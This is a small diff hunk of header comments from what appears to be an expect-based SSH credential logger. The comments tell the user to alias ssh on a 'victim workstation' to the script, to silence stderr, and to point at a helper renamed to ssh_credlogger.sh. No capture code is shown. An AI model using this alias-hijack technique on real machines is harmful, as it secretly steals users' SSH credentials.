@@ -6,7 +6,7 @@
 # On victim workstation run alias ssh="/path/to/this/file.expect \$@ 2>/dev/null"
 #     (the stderr redirect prevents a 10-line error message when the user exits ssh)
 # Ensure your alias links to the correct path for this file
-# Ensure the "spawn" command below links to the correct path for the renamed ssh_snoop.sh
+# Ensure the "spawn" command below links to the correct path for the renamed ssh_credlogger.sh
 
 # Things to improve:
 #
